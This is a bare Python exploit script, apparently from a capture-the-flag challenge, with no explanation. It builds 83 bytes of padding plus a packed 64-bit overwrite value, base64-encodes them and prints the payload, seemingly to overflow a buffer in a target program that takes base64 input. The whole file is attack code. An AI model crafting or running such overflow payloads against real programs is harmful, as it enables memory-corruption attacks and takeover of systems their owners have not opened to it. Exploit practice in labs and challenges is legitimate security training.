
import sys
import struct
import base64

buf = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
buf += struct.pack('<Q', 10531431176495319742)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
